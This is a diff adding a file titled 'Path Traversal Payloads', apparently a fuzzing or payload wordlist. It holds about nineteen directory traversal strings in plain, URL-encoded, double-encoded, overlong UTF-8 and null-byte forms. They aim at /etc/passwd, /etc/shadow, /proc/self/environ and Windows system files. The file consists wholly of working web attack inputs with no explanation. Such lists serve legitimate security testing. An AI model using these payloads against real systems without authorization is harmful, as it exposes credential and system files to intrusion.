@@ -1,0 +1,20 @@
+# Path Traversal Payloads
+../../../etc/passwd
+..\/..\/..\/etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+..%252f..%252f..%252fetc/passwd
+..%c0%af..%c0%af..%c0%afetc/passwd
+/etc/passwd
+/etc/shadow
+/proc/self/environ
+/proc/self/cmdline
+..\..\..\..\windows\win.ini
+..\..\..\..\windows\system32\drivers\etc\hosts
+....\\....\\....\\windows\\win.ini
+..%5c..%5c..%5cwindows%5cwin.ini
+C:\windows\win.ini
+/../../../../../../etc/passwd%00
+/../../../../../../etc/passwd%00.html
+/..%00/..%00/..%00/etc/passwd
